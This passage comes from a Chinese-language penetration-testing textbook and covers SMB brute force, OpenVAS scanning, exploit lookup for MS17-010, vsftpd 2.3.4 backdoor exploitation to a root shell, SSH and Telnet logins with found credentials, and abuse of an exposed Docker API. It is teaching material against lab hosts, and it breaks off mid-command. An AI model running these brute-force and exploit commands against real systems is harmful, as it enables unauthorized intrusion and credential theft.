  \n我们将在第 7 章 中测试远程主机容易受到 `ms17‐010` 的攻击。目前，我们只是收集信息。（这可能是误报；不要依赖我们在此阶段收集的结果的准确性。）注意，你可以使用\
  \ `smb‐enum` 脚本选项来添加更多枚举结果：\n\n```\nroot@kali:~# nmap -sV -p 445 --script=smb-enum\
  \ 172.16.0.106\n```\n\n如果你想为此目的探索更多工具，我邀请你也尝试 `Enum4Linux` 枚举：\n\n```\n$enum4linux\
  \ -a [IP address]\n```\n\n### SMB 暴力破解\n\n我们可以使用 Metasploit 的 `smb_login` 辅助模块代替\
  \ Hydra 来处理 SMB 协议，因为它产生的误报更少且性能更好。为了获得良好的结果，你可以调整你的扫描器，因为你不想让它白浪费资源（选项自说自明）：\n\n\
  ```\nmsf5 > auxiliary/scanner/smb_login\nmsf5(scanner/smb/smb_login) > set BLANK_PASSWORDS\
  \ true\nBLANK_PASSWORDS = true\nmsf5(scanner/smb/smb_login) > set PASS_FILE /usr/share/wordlists/rockyou.txt\n\
  PASS_FILE = /usr/share/wordlists/rockyou.txt\nmsf5(scanner/smb/smb_login) > set\
  \ RHOSTS 172.16.0.106\nRHOSTS = 172.16.0.106\nmsf5(scanner/smb/smb_login) > set\
  \ SMBUser admin\nSMBUser = admin\nmsf5(scanner/smb/smb_login) > set STOP_ON_SUCCESS\
  \ true\nSTOP_ON_SUCCESS = true\nmsf5(scanner/smb/smb_login) > set THREADS 100\n\
  THREADS = 100\nmsf5(scanner/smb/smb_login) > set USER_AS_PASS true\nUSER_AS_PASS\
  \ = true\nmsf5(scanner/smb/smb_login) > set VERBOSE false\nVERBOSE = false\nmsf5(scanner/smb/smb_login)\
  \ > run\n[+] 172.16.0.106:445 - 172.16.0.106:445 - Success: 'admin:admin'\n[*] 172.16.0.106:445\
  \ - \n```\n\n#### SNMP 枚举\n\nNmap 很好很好地展示了所有信息。事实上，输出非常庞大，会占据很多页面，所以为了清晰，我删除了大部分内容。Nmap\
  \ 输出中最重要的部分是该 SNMP 服务的版本以及使用的社区字符串（public）。\n\n### 总结\n\n理想情况下你会喜欢这个枚举章节。在渗透测试阶段，我们收集了不同类型服务的信息。收集到的枚举数据将用于逐个利用这些服务。在下一章中，你将学习如何通过远程\
  \ shell 利用这些服务（以及更多内容）。\n\n# 第 7 章\n\n利用阶段\n\n在本章中，你将开始看到一些实际攻击并进入系统。在上章中，你已经拥有了每个服务的信息，在本章中，我们将更进一步，利用这些漏洞。\n\
  \n\n\n\n\n此外，你将学习如何对典型组织进行漏洞评估，如果你想将安全作为你的职业，这将会非常有帮助。\n\n在本章中，你将学习到以下内容：\n\n* 漏洞评估\n\
  * 针对漏洞利用的公开研究\n* FTP 服务利用\n* SSH 服务利用\n* Telnet 服务利用\n* 电子邮件服务器利用\n* Docker 引擎利用\n\
  * Jenkins 门户利用\n* 反向 Shell (Reverse shells)\n* SMB 协议利用\n\n## 漏洞评估 (Vulnerabilities\
  \ Assessment)\n\n漏洞漏洞包括使用专业扫描器发现网络中远程主机（或子网中的多个主机）上的漏洞。在上一章中，我们使用了 `Nmap` 中的 `scan`\
  \ 脚本。通常情况下，`Nmap` 中的大多数脚本（并非所有脚本）都会对漏洞执行一些必要的检查。例如，当你运行 `FTP*` 脚本选项时，它将包含 `Nmap`\
  \ 中的漏洞扫描功能。如果你想更有针对性，可以使用 `ftp‐vuln*` 选项来实现最终结果。请注意，漏洞评估与补丁管理有一定的关系。如果你在企业环境中工作，你会经常遇到这项任务，频率甚至高于渗透测试本身。许多公司停留在这一阶段，而不对发现的漏洞进行利用。相反，他们尝试根据工具生成的报告修复漏洞。高层会优先考虑严重和高危漏洞，并敦促\
  \ IT 人员尽快修复补丁。\n\n在现实世界中，公司使用更先进的自动化扫描器，以下是一些在企业环境中使用的扫描器示例：\n\n* 来自 Tenable：\n\
  \    * Nessus 和 Tenable.sc（本地化解决方案）\n    * Tenable.io（云解决方案）\n* 来自 Rapid7：\n   \
  \ * Nexpose（本地化解决方案）\n    * InsightVM（云解决方案）\n* Qualys Scanner（云解决方案）\n\n所有这些扫描器都使用相同的原理。如果你了解漏洞扫描的基础知识，就能轻松使用任何类型的扫描器。为了向你展示基础知识，我们将使用\
  \ `OpenVAS`，这是一种开源免费的安全扫描器来完成工作。\n\n### 漏洞评估工作流 (Vulnerability Assessment Workflow)\n\
  \n在继续之前，让我们来看看完成成功的漏洞评估任务的逻辑顺序。你为什么需要对资产进行分类？这个问题有多个答案：\n\n* 它允许扫描器准确地运行任务。例如，扫描器对移动设备和\
  \ Windows 主机会有不同的模板，等等。\n* 你可以优先考虑漏洞补丁管理。例如，生产服务器上的严重漏洞比内网开发服务器上的严重漏洞更重要。\n* 它允许你为了补丁管理而对设备进行逻辑隔离。例如，对资产进行分组允许你在被要求时轻松地列出生产环境中的所有主机。\n\
  \n以下是步骤：\n\n1. **对资产分组**：在开始漏洞评估之前，你必须将资产分为不同的类别。以下是一些示例：\n    * 网络设备\n    * 物联网\
  \ (IoT) 设备\n    * 用户主机\n    * 开发服务器\n    * 预生产服务器\n    * Windows 生产服务器\n    * Linux\
  \ 生产服务器\n    * 电话/VoIP\n    * 平板和手机\n2. **访问管理 (Access management)**：漏洞扫描的另一个前提是授予扫描器访问权限以执行其功能。换句话说，如果漏洞扫描器在目标主机上没有正确的权限，它将无法正常扫描。以下是你需要端需要做的工作：\n\
  \    * 为 Linux 主机创建自定义账户。扫描器将使用 `SSH` 进行身份验证。\n    * 为 Windows 主机创建自定义账户。扫描器随后将使用\
  \ `Samba` 协议进行身份验证。你需要使用 `LDAP` 来实现。（由于你不想在每个主机上都创建一个新账户，只需在活动目录创建一个账户并在到处复用它。）\n\
  \    * 在每个目标主机上安装代理 (agent)。大多数云端扫描器都需要你使用这种模式。代理将扫描每个主机上的服务并将结果传回给主节点。此外，代理将在主机上本地运行，因此结果会更准确。\n\
  3. **创建扫描**：完成上述两个步骤后，你可以开始创建扫描。每个厂商都会提供不同的扫描模板。例如，你将有一个针对移动设备的扫描模板。在这种情况下，扫描引擎将根据扫描类型产生更准确的结果。如果你正确识别并分组了资产，那么这一步应该很容易实现。\n\
  4. **报告 (Report)**：实现成功的漏洞评估的最后一步是报告步骤。同样，如果你工作正确并对资产和扫描进行了分段，那么报告部分就不应该是麻烦。报告中将会有误报；你的工作是在报告给管理层之前识别出它们。对于大型网络，你发现的漏洞数量将让你惊讶。在某些公司中，他们要求安全分析师重新评估安全风险评分（每个漏洞），以减少误报并报告更准确的结果。\n\
  \n### 使用 OpenVAS 进行漏洞扫描 (Vulnerability Scanning with OpenVAS)\n\n是时候使用免费漏洞扫描器 `OpenVAS`\
  \ 进行一些真实示例的练习了。本节仅供练习之，但在现实世界中，许多大公司投入了昂贵的专业漏洞扫描器（如我之前提到的那些）。同样的原理也适用于另一个名为 `OpenVAS`\
  \ 的扫描器；让我们开始吧！\n\n#### 安装 OpenVAS\n\nKali 团队经常根据不同的发行版更改 `OpenVAS` 的状况。换句话说，你有时可能会看到预安装的\
  \ `OpenVAS`，而在其他发行版中没有。要安装它，请执行以下操作：\n\n```\nroot@kalikali# apt update\nroot@kali#\
  \ apt install openvas -y\nroot@kali# openvas‐setup\n```\n\n最后一个命令完成后，不要关闭终端窗口。安装将显示用于登录网络门户的密码。在输出示例中，你会看到生成了一个密码：\n\
  \n```\n[>] Checking for admin user\n[*] Creating admin user\nUser created with password\
  \ '0223982d‐1935‐4053‐a300‐7b2843f2ab61'.\n[+] Done\n```\n\n要访问网络门户，请在浏览器中打开以下链接，如图\
  \ 7.1 所示。（使用你之前获得的凭据。此外，确保保存密码以便以后使用。）\n\n```\nhttps://127.0.0.1:9392/login/login.html\n\
  ```\n\n![OpenVAS 网络门户截图。](img/c07f001.png)\n\n图 7.1 OpenVAS 网络门户\n\n#### 使用 OpenVAS\
  \ 进行扫描\n\n我们将使用使用 `OpenVAS` 进行扫描的工作流：\n\n1. 创建一个资产组来扫描 Windows 主机。（在 `OpenVAS` 中，它被称为\
  \ `Targets`。）\n2. 使用 Windows `SMB` 账户让扫描器登录目标主机。\n3. 创建一个任务来扫描之前识别的目标主机。\n4. 运行扫描。\n\
  5. 在扫描完成后检查报告。\n\n##### 创建目标列表 (Create a Target List)\n\n在菜单中，选择 `Configuration`\
  \ 项；然后点击 `Targets`。\n\n进入页面后，点击蓝色小星形按钮创建新目标。在应用程序的最新版本中，按钮位于屏幕左侧，如图 7.2 所示。\n\n\
  ![OpenVAS 新目标截图。](img/c07f002.png)\n\n图 7.2 OpenVAS 新目标\n\n\n\n\n一个新的空白目标窗口将打开。在此阶段，我们需要添加以下信息（请参阅\
  \ 图 7.3 ）：\n\n*   为资产组（目标）命名名称并提供一个描述。\n*   指定主机的 IP 地址。\n*   可选地标识 SMB 账户（如果你想进行经过身份验证的扫描）。\n\
  *   指定你希望用于此类资产的端口范围。\n\n## 创建扫描任务\n\n要创建扫描任务，请选择 `Scans`（扫描）菜单，然后点击 `Tasks`（任务）项。\n\
  \n再次点击蓝色小星号按钮创建一个新任务。当窗口加载后，你需要提供以下信息（请参阅 图 7.4）：\n\n*   为任务命名并提供一个描述。\n*   选择组目标名称；这里是\
  \ `Scan Targets`（扫描目标）。\n*   在 `Scan Config`（扫描配置）中，选择扫描类型（快速或深度且缓慢）。\n\n![OpenVAS\
  \ 目标选项截图。](img/c07f003.png)\n\n图 7.3 OpenVAS 目标选项\n\n创建任务后，你可以通过点击任务页面上 `Actions`（操作）列下的绿色播放按钮来运行它（请参阅\
  \ 图 7.5）。\n\n一旦扫描完成后，状态将设置为 `Done`（已完成）。要自动刷新结果，你需要在右上角的下拉列表（登录用户名附近）设置刷新计时器。默认情况下，下拉列表设置为\
  \ `No Auto-Refresh`（不自动刷新），因此你必须使用浏览器的 `Refresh`（刷新）按钮手动刷新页面。\n\n## 查看报告\n\n一旦扫描器完成扫描任务，你就可以通过选择\
  \ `Scans` ➪ `Reports` 来视视化报告。\n\n在报告页面上，点击 `Date`（日期）列下的链接。（如果你有多次扫描，必须选择正确的任务。）你将被重定向到报告结果处（请参阅\
  \ 图 7.6）。\n\n![OpenVAS 任务选项截图。](img/c07f004.png)\n\n图 7.4 OpenVAS 任务选项\n\n![OpenVAS\
  \ 运行一个任务截图。](img/c07f005.png)\n\n图 7.5 OpenVAS 运行一个任务\n\n![OpenVAS 报告结果截图。](img/c07f006.png)\n\
  \n图 7.6 OpenVAS 报告结果\n\n接下来要做什么？你在此阶段的工作是测试每个漏洞并验证其是否可被利用（避免假误报）。\n\n## 漏洞研究\n\n\
  到目前为止，你已经看到了我们是如何进行漏洞枚举和扫描的。在这个阶段，我们需要通过公共搜索对发现的每个可被利用的漏洞进行研究。在专业环境中，公司主要使用以下工具：\n\
  \n*   Metasploit Pro（而非免费版）\n*   Core Impact\n\n其他工具也用于此目的，但这些是最流行的。这些工具不是免费的，需要付费，但对于企业来说，为了节省时间和避免无用功，拥有它们是必须的。你不总是能访问这些工具（取决于你工作的客户）。相反，我们可以遵循此模式：\n\
  \n1.  检查 `Metasploit`（社区版）中是否存在漏洞。\n2.  如果 `Metasploit` 中没有该漏洞，使用 Google 搜索引擎输入你正在寻找的漏洞名称：\n\
  \    *   如果它出现在搜索结果顶部，可以使用 [exploit-db.com](http://exploit-db.com)。\n    *   如果漏洞未列在\
  \ `exploit-db` 上，你也可以使用 `GitHub`。\n\n让我们以之前的 OpenVAS 报告中发现的漏洞之一作为一个实际示例（请参阅 图 7.7）。\n\
  \n每个漏洞扫描产品都会显示一个部分，展示如何利用所选漏洞的引用信息。在之前的漏洞 `MS17-010` 的情况下，引用部分指向了 `Rapid7`（Metasploit\
  \ 的者）的 `GitHub` 仓库（请参阅 图 7.8）。如果你想知道我是从哪里获得这些信息的，请查看摘要部分的 图 7.7 。\n\n![OpenVAS –\
  \ 漏洞结果样本截图。](img/c07f007.png)\n\n图 7.7 OpenVAS – 漏洞结果样本\n\n这意味着我们可以使用 `Metasploit\
  \ Framework` 来完成工作。我们将打开 `Metasploit` 并使用搜索功能查找 `ms17-010`：\n\n```\nmsf5> search\
  \ ms17010\n\nMatching Modules\n================================================================\n\
  Name                                           Date       Rank    Description\n\
  ------------------------------------------------------------------    -----   -----------\n\
  exploit/windows/smb/ms17_010_msfexec           2017-03-02  excellent Yes     SMB\
  \ Remote Execution\nexploit/windows/smb/ms17_010_eternalblue      2017-03-14  average\
  \ Yes     EternalBlue Kernel\nexploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14\
  \  average Yes     EternalBlue Win8\nexploit/windows/smb/ms17_010_doublepulsar \
  \   2017-04-14  great    Yes     SMB Remote Code\nexploit/windows/smb/ms17_010_eternalar_ce\
  \       2017-04-14  normal   Yes     SMB Code Execution\n```\n\n在章节之后，我们将详细介绍如何利用\
  \ SMB 协议。如果你使用了 Google 搜索，还会获得 `exploit-db` 的链接（请参阅 图 7.9）。\n\n![OpenVAS 报告引用截图。](img/c07f008.png)\n\
  \n图 7.8 OpenVAS 报告引用\n\n![Google 搜索漏洞截图。](img/c07f009.png)\n\n图 7.9 Google 搜索漏洞\n\
  \n## SearchSploit\n\n你可以使用 `SearchSploit` 工具在终端而不是网页中使用 [exploit-db.com](http://exploit-db.com)\
  \ ：\n\n```\n$searchploit [Options] [Search Terms]\n```\n\n在启动工具之前，你需要更新它的数据库以与在线版本的\
  \ `exploit-db` 同步：\n\n```\n$searchploit --update\n```\n\n这里是对著名的 `ms17-010` 的基础搜索：\n\
  \n```\nroot@kali:~# searchploit ms17-010\n```\n\nSearchSploit 非常强大，因为你可以使用 Linux\
  \ 命令行过滤工具（例如 `grep`）来完成工作。你需要注意的内置过滤功能之一是 `exclude` 选项。由于 SearchSploit 会显示大量输出，我通常会排除\
  \ DOS 结果。这是一个示例：\n\n```\nroot@kali:~# searchploit ms17-010 --exclude=\"/dos/\"\n\
  ```\n\n\n\n\n\n一旦你从结果中选择了一个项目，你就必须将文件复制到另一个目录（这样就不会更改原始文件的内容）。例如，我将使用 `--mirror`\
  \ 选项复制之前搜索结果中的第一项（`$searchsploit ms17‐010`）：\n\n```\nroot@kali:~# searchsploit --mirror\
  \ 43970 /root/\n Exploit: Microsoft Windows - 'EternalRomance'/'EternalSynergy'/'EternalChampion'\
  \ SMB Remote Code Execution (Metasploit) (MS17-010)\n   URL: https://www.exploit-db.com/exploits/43970\n\
  \   Path: /usr/share/exploitdb/exploits/windows/remote/43970.rb\nFile Type: Ruby\
  \ script, ASCII text, with CRLF line terminators\n\nCopied to: /root/43970.rb\n\
  ```\n\n## 服务利用\n\n在上一章节中，我们列举了作为渗透测试人员生涯中可能会遇到的最常用的服务。在本节中，我们将利用之前尝试枚举的大多数服务。你将学习如何将这些点连接起来，从而实现成功的渗透测试职业。\n\
  \n#### 利用 FTP 服务\n\n要连接到 FTP 服务器，我们可以在 Kali 上使用 `FileZilla` 作为客户端。要安装它，请使用以下命令：\n\
  \n```\nroot@kali:~# apt install filezilla -y\n```\n\n下一步是验证我们在枚举阶段收集的信息：\n\n**枚举结果**\n\
  \n*   允许匿名登录\n*   user:user 有效凭据\n*   ftp:123456789 有效凭据\n*   vsFTPd 版本 2.3.4 存在利用漏洞\n\
  \n#### FTP 登录\n\n要使用匿名登录进行连接，我们将使用 `FileZilla` 并输入以下凭据（参见图 7.10）：\n\n![FileZilla\
  \ FTP 连接截图。](img/c07f010.png)\n\n图 7.10 FileZilla FTP 连接\n\n*   **主机 (Host)**: metasploitable.kcorp.local\n\
  *   **用户名 (Username)**: anonymous\n*   **密码 (Password)**: anypassword（你可以在此处输入任何内容）\n\
  \nFTP 客户端已成功连接到远程主机。遗憾的是，远程目录是空的。以下是此阶段你可以实现的一些常见思路：\n\n*   FTP 服务器上的文件中存储了机密信息。\n\
  *   如果你发现了可执行文件（例如 `java2.1.exe`），请检查是否存在公共漏洞，因为该软件极已经安装在远程主机上。\n*   检查你是否可以上传文件。这意味着你可能通过其他手段调用它们，从而获得反向\
  \ shell。\n    *   通过 Web 应用程序\n    *   通过受限的 shell（以获得 root shell）\n\n使用 `FileZilla`\
  \ 检查另外两个凭据也被证明是有效的。我们能够成功连接到 FTP 服务器。但用户名 `user` 让我们能够访问用户的所有目录（`/home`），如图 7.11\
  \ 所示。\n\n![FileZilla FTP 连接建立。](img/c07f011.png)\n\n图 7.11 FileZilla FTP 连接建立\n\n\
  #### 远程代码执行\n\n是时候检查该服务器是否有远程 shell 了。根据 `nmap` 扫描，此版本的 `vsFTPd` 2.3.4 受到一个公共漏洞的影响：\n\
  \n```\nftp-vsftpd-backdoor: \n   VULNERABLE:\n   vsFTPd version 2.3.4\n     State:\
  \ VULNERABLE (Exploitable)\n     IDs: BID:48539 CVE-2011-2523\n     vsFTPd version\
  \ 2.3.4 backdoor, this was reported on 2011-07-04.\n     Disclosure date: 2011-07-03\n\
  \     Exploit results:\n       Shell command: id\n       Results: uid=0(root) gid=0(root)\n\
  \       References:\n       http://scarybeast.blogspot.com/2011/07/alert-vsftpd-downloadored.html\n\
  \       https://github.com/rapid7/metasploit-framework/blob/exploits/ftp/vsftpd_234_backdoor.rb\n\
  \       https://cve.mitre.org/cgi-bin/cve.cgi?name=CVE-2011-2523\n       https://www.securityfocus.com/48539\n\
  ```\n\n为了双重确认，我们通常可以去 Google 搜索引擎寻找漏洞（参见图 7.12）。\n\n![Google 搜索 – FTP 漏洞。](img/c07f012.png)\n\
  \n图 7.12 Google 搜索 – 漏洞\n\n根据之前的结果，第一个链接指向 rapid7 网站。换句话说，我们应该能够 Metasploit 来利用它：\n\
  \n```\nmsf5> search vsftpd type:exploit\n\nMatching Modules\n================\n\n\
  \ # Name                               Disclosure Date Rank      Check Description\n\
  \ -                                 ---------------      -----\n 0 exploit/unix/ftp/vsftpd_234_backdoor\
  \ 2011-07-03      excellent VFTPD v2.3.4 Backdoor\n```\n\n看起来我们有了一个很好的候选对象。让我们看看它是否可以被利用。如果你是\
  \ Metasploit 的新手，并不知道每个模块应该选择哪些选项，答案简单地输入 `options` 即可。但首先，你需要执行 `use` 命令来加载 `exploit`\
  \ 模块：\n\n```\nmsf5> use exploit/unix/ftp/vsftpd_234_backdoor\nmsf5 exploit(unix/ftp/vsftpd_234_backdoor)>\
  \ options\n\nModule options (exploit/unix/ftp/vsftpd_234_backdoor):\n\n Name Current\
  \ Setting Required Description\n ---- --------------- -------- -----------\n RHOSTS\
  \ yes 目标主机，范围 CIDR 标识符，或语法为 'file:<path>'的主机文件\n RPORT 21 yes 目标端口 (TCP)\n\nExploit\
  \ target:\n\n Id Name\n -- ----\n 0 Automatic\n```\n\n根据之前的选项，我们有两个必需的选项值：\n\n*\
  \   `RHOSTS`（远程主机 IP）\n*   `RPORT`（远程端口号）\n\n`RPORT` 值已设置为默认 FTP 端口 21。接下来，我们需要输入\
  \ Metasploitable 的 IP 地址并执行 `run` 命令，查看我们是否可以利用远程主机：\n\n```\nmsf5 exploit(unix/ftp/vsftpd_234_backdoor)>\
  \ set RHOSTS 172.16.0.101\nRHOSTS => 172.16.0.101\nmsf5 exploit(unix/ftp/vsftpd_234_backdoor)>\
  \ run\n\n[*] 172.16.0.101:21 - Banner: 220 (vsFTPd 2.3.4)\n[*] 172.16.0.101:21 -\
  \ USER: 331 Please specify the password.\n[+] 17.16.0.101:21 - Backdoor service\
  \ has been spawned, handling…\n[+] 172.16.0.101:21 - UID: uid=0(root) gid=0(root)\n\
  [*] Found shell.\n[*] Command shell session 3 opened (0.0.0.0:0 -> 172.16.0.101:6200)\
  \ at 2020-06-24 10:43:31 -0400\n\nls\nbin\nboot\ncdrom\ndev\netc\n[...]\n```\n\n\
  看这里！我们有了了本书中的第一个远程 shell 利用案例。接下来，我们需要产生 shell。\n\n#### 产生 Shell\n\n在之前的 shell 中，我们缺少终端窗口的\
  \ shebang。使用 Python 产生 shell 将允许我们完成任务。首先，使用 `which` 命令检查主机上是否安装了 Python。之后，我们可以执行\
  \ Python `spawn` 命令：\n\n```\nwhich Python\n/usr/bin/python\npython -c 'import pty;pty.spawn(\"\
  /bin/bash\")'\nroot@metasitable:/#\n```\n\n好了，看起来我们得到了 root shell。让我们使用 `id` 命令进行双重确认：\n\
  \n```\nroot@metasitable:/# id\nid\nuid=0(root) gid=0(root)\nroot@metasitable:/#\n\
  ```\n\n确实，这是一个 root shell，所以我们不需要费力权限提升技术。W00t W00t（这是我在想要庆祝远程 root shell 时使用的词汇）。\n\
  \n#### 利用 SSH 服务\n\n在枚举阶段获得 SSH 的某些凭据是一项巨大的成就。通常，这就是你应该寻找的所有内容，因为一旦成功登录，你就已经获得了一个\
  \ shell。\n\n\n\n\n\n```\nroot@kali:~# ssh user@metasploitable.kcorp.local\nThe authenticity\
  \ of host 'metasploitable.kcorp.local (172.16.0.101)' can't be established.\nRSA\
  \ key fingerprint is SHA256:BQHm5EoHX9GCiOLuVscegPXLQOsuPs+E9d/rrJB84rk.\nAre you\
  \ sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently\
  \ added 'metasploitable.kcorp.local,172.16.0.101' (RSA) to the list of known hosts.\n\
  user@metasploitable.kcorp.local's password: \nLinux metasploitable 2.6.24-16-server\
  \ #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686\n\nThe programs included with the Ubuntu\
  \ system are free software;\nthe exact distribution terms for each program are described\
  \ in the\nindividual files in `/usr/share/doc/*/copyright.\n\nUbuntu comes with\
  \ ABSOLUTELY NO WARRANTY, to the extent permitted by\napplicable law.\n\nTo access\
  \ official Ubuntu documentation, please visit:\nhttp://help.ubuntu.com/\nLast login:\
  \ Mon Jun 8 16:50:21 2020 from 172.16.0.102\nuser@metasploitable:~$\n```\n\n运行成功了！下一个挑战是检查该用户的权限。换句话说，我们是\
  \ root 吗？\n\n```\nuser@metasploitable:~$ id\nuid=1001(user) gid=1001(user) groups=1001(user)\n\
  user@metasploitable:~$ cat /etc/shadow\ncat: /etc/shadow: Permission denied\nuser@metasploitable:~$\n\
  ```\n\n根据之前的信息，该用户没有 root 权限执行的授权。也许另一个用户 `service` 有 root 权限。让我们尝试一下：\n\n```\n\
  root@kali:~# ssh service@metasploitable.kcorp.local\nservice@metasploitable.kcorp.local's\
  \ password: \nLinux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC\
  \ 2008 i686\n\nThe programs included with the Ubuntu system are free software;\n\
  the exact distribution terms for each program are described in the\nindividual files\
  \ in `/usr/share/doc/*/copyright.\n\nUbuntu comes with ABSOLUTELY NO WARRANTY, to\
  \ the extent permitted by\napplicable law.\n\nTo access official Ubuntu documentation,\
  \ please visit:\nhttp://help.ubuntu.com/\nservice@metasploitable:~$ id\nuid=1002(service)\
  \ gid=1002(service) groups=1002(service)\nservice@metasploitable:~$ cat /etc/shadow\n\
  cat: /etc/shadow: Permission denied\nservice@metasploitable:~$\n```\n\n这与之前的会话一样——我们没能获得\
  \ root shell。\n\n### Telnet 服务利用\n\n这与 SSH 相同。Telnet 服务器将允许我们远程连接到命令行。在上一章节中，我们收集了以下信息：\n\
  \n*   **服务器版本**: 23/tcp open telnet Linux telnetd\n*   **有效凭据**: username=user;password=user\n\
  \n#### Telnet 登录\n\n让我们在 Kali Linux 中使用 `telnet` 命令连接并测试在枚举阶段发现的之前的凭据：\n\n```\n\
  root@kali:~# telnet metasploitable.kcorp.local\nTrying 172.16.0.101…\nConnected\
  \ to metasploitable.kcorp.local.\n[…]\n\nmetasploitable login: user\nPassword: \n\
  Last login: Thu Jun 25 08:21:41 EDT 2020 from 172.16.0.102 on pts/1\nLinux metasploitable\
  \ 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686\n\nThe programs included\
  \ with the Ubuntu system are free software;\nthe exact distribution terms for each\
  \ program are described in the\nindividual files in `/usr/share/doc/*/copyright.\n\
  \nUbuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by\napplicable\
  \ law.\n\nTo access official Ubuntu documentation, please visit:\nhttp://help.ubuntu.com/\n\
  user@metasploitable:~$ id\nuid=1001(user) gid=1001(user) groups=1001(user)\nuser@metasploitable:~$\n\
  ```\n\n如你从之前的终端输出所示，我们远程连接到了 Telnet 服务器。由于该用户的权限有限，我们获得的是一个低权限 shell。\n\n#### 嗅探明文信息\n\
  \n如果你还记得上一章节，我们学过 Telnet 服务在网络上以明文发送通信。现在我们将看看这在 Wireshark 嗅探器中是什么样的。我们将在 Kali 主机上运行\
  \ Wireshark 以拦截所有出站包。在实际场景中，你需要在交换机层面通过设置端口镜像（port mirroring）将所有流量复制到一个交换机端口来拦截通信。这取决于制造商，但通过检查交换机厂商的手手册即可实现。此外，还有一些硬件工具，你可以插入网线并将连接重定向到输出连接（连接到你的\
  \ Kali 主机）。\n\n要执行 Wireshark，只需在终端窗口中输入它的名称，或者可以通过 Kali 菜单选择 09 – Sniffing & Spoofing\
  \ ➪ Wireshark 打开。\n\n窗口加载后，选择你想监听的网络接口（参见图 7.13）。在这种情况下，我们将选择 `eth0`。双击它开始嗅探传入和出的流量。\n\
  \n让我们尝试远程连接 Telnet 服务器并执行一些命令。之后，我们将检查 Wireshark 是否捕获了其中任何内容（参见图 7.14）。首先，我们需要在\
  \ Wireshark 内部仅过滤 Telnet 数据包。要这样做，请在过滤器栏输入以下字符串：\n\n```\ntcp == 23\n```\n\n过滤器执行后，右键点击任何数据包并选择\
  \ Follow ➪ Stream（参见图 7.15）。\n\n### 邮件服务器利用\n\n为了使攻击生效，我们需要一个被破解的用户（例如使用 Hydra）。你也可以通过其他渠道获取此信息，例如社交工程学等。\n\
  \n接下来，我们需要在 Kali 主机上安装一个邮件客户端。为了这个目的，让我们使用 `evolution` 程序（你也可以使用 Thunderbird）。\n\
  \n使用常规的 `apt install` 命令安装：\n\n```\nroot@kali:~# apt install -y\n```\n\n首次执行时，你需要设置邮件服务器的收发设置以及所有收件箱信息。在此阶段，你必须知道以下信息：\n\
  \n*   电子邮件用户名（在我们的示例中为 `gus@kcorp.local` ）\n*   邮箱密码\n*   邮件服务器地址（在我们的示例中为 `mail.kcorp.local`\
  \ ）\n\n在图 7.17 所示的第一个窗口中，我建立了 IMAP/SSL 配置。如果你想使用非安全的 IMAP，请选择端口 143 并确保将加密方法更改为无加密（参见图\
  \ 7.17）。\n\n接下来，我们将发送选项配置为安全的 SMTP 端口 465。同样，如果你想使用明文协议，请将端口设置为 25 并确保将加密方法更改为无加密（参见图\
  \ 7.18）。\n\n\n\n\n最后，图 7.19 显示了 Gus 在 KCorp 职业生涯初期在收件箱中收到的一封令人兴奋的邮件。\n\n![邮件收件箱截图。](img/c07f019.png)\n\
  \n图 7.19 邮件收件箱\n\n## Docker 漏洞利用\n\n为了理解这一部分，你需要两个前提条件。首先，你需要了解我们在上一个枚举章节中涵盖的所有内容。其次，你需要熟悉\
  \ Docker 技术；如果你不熟悉，请访问附录，那里有一门专门介绍如何如何处理 Docker 容器的课程。\n\n在这一漏洞利用场景中，有两个宿主机虚拟机（见图\
  \ 7.20）：\n\n* `Kali Linux`（攻击者）: `172.16.0.102`\n* `Ubuntu Linux`: `172.16.0.103`\n\
  \n在目标 Ubuntu 宿主机上，我们将安装一个 `Docker engine`（开放 TCP 端口 `2375`）并让一个 `Jenkins container`\
  \ 运行。\n\n注意，Docker 容器有它们自己的网络子网；对于本示例，Docker 容器的网络是 `172.17.0.0/16`。\n\n### 测试 Docker\
  \ 连接\n\n为了与远程 Docker 引擎交互，我们首先需要在我们的 Kali 宿主机上安装一个 `Docker client`：\n\n```\n root@kali:~#\
  \ apt update && apt install docker.io -y\nroot@kali:~# systemctl start docker &&\
  \ systemctl enable docker\n```\n\n![Docker 主机设计原理示意图。](img/c07f020.png)\n\n图 7.20\
  \ Docker 主机设计\n\n为了测试我们是否可以连接到远程 Docker，让我们执行一个测试函数来列出 Ubuntu 宿主机上的容器：\n\n```\n\
  \ root@kali:~# docker ‐H 172.16.0.103:2375 ps ‐a\nCONTAINER ID IMAGE   COMMAND \
  \               CREATED     STATUS     PORTS                                   \
  \         NAMES\n7dd7d926605a jenkins \"/bin/tini -- /usr/l…\" 2 hours ago Up 2\
  \ hours 0.0.0.0:8080->8080/tcp, 0.0.0.0:50000->50000/tcp labjenkins\n```\n\n完美，通畅了！接下来，我们将在\
  \ Ubuntu 宿主机上运行一个新的容器来攻破它。\n\n### 创建一个新的远程 Kali 容器\n\n在此阶段，我们将在 Ubuntu 上创建一个新的 Kali\
  \ 容器。记住，我们正在使用 Kali 虚拟机来远程在受害的 Ubuntu 宿主机上运行这些 `Docker commands`\n\n#### 下载 Kali\
  \ 镜像\n\n首先，从 Docker Hub 下载 Kali Linux 镜像：\n\n```\n root@kali:~# docker ‐H 172.16.0.103:2375\
  \ pull kalilinux/kali\nUsing default tag: latest\nlatest: Pulling from kalilinux/kali\n\
  ba24b40d7ccc: Pull complete \nDigest: sha256:0954a8766c13e16bfc3c4ad1cdd457630bc6f27a2f6a7f456015f61956cabd08\n\
  Status: Downloaded newer image for kalilinux/kali:latest\ndocker.io/kalilinux/kali:latest\n\
  ```\n\n#### 检查镜像是否已下载\n\n让我们让我们始终双重检查镜像是否下载成功：\n\n```\n root@kali:~# docker ‐H 172.16.0.103:2375\
  \ images\nREPOSITORY        TAG     IMAGE ID        CREATED         SIZE\nkalilinux/kali\
  \    latest  bd513360cce5    4 days ago      114MB\njenkins           latest  cd14cecfdb3a\
  \    23 months ago   696MB\n```\n\n#### 运行容器\n\n接下来，我们将运行容器并将 Ubuntu 的根目录（`/`）挂载到\
  \ Kali 容器的 `/mnt` 上（因为我们稍后想要攻破 Ubuntu 宿主机）：\n\n```\n root@kali:~# docker ‐H 172.16.0.103:2375\
